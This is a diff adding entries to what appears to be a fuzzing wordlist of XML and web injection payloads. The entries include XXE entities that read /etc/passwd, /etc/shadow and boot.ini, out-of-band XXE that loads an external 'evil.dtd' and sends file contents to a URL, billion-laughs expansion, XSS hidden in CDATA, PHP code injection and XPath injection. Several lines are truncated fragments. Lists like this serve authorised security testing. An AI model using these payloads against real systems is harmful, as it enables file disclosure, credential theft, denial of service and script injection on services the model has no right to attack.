@@ -64,3 +64,57 @@ init SYSTEM "data://text/plain;base64
 SYSTEM "php:
 <title>XXE Test
 <void method="exec">
+-------------------
+<!DOCTYPE xxe [<!ENTITY foo 
+<!DOCTYPE xxe
+[<!ENTITY foo 
+ncoding="ISO-8859-1"?><
+<foo>&xxe;</foo>
+file:///etc/passwd
+file:///etc/issue
+file:///etc/issue
+file:///etc/shadow
+file:///c:/boot.ini
+file:///c:/boot.ini
+<!ENTITY xxe SYSTEM "http
+file:////dev/
+<test></test>
+<![CDATA[<test></test>]]>
+&foo;
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<name>','')); phpinfo(); exit;/*</name>
+%foo;
+"&lol1;&lol1
+<lolz><lol>3..2..1...&test<lol></lolz>
+"}}</script><script>alert(
+}}</script>'"
+}}</script>'
+}}</script><script>alert(1);</script></body></html><!-- 
+"}}</script>'
+}}</script>""'"
+'}}</script>'
+'}}</script>"
+count(/child::node())
+x' or name()='username' or 'x'='y
+<name>','')); phpinfo(); exit;/*</name>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('
+<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert
+[CDATA[' or 1=1 or ''=']]></foo>
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(
+<xml ID="xss"><I><B>
+<xml SRC="xsstest.xml"
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xss
+<HTML xmlns:xss><?import namespace=
+<HTML xmlns:xss
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/text.txt" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  "> %int;
+<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///etc/issue"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
+<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///c:/boot.ini"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
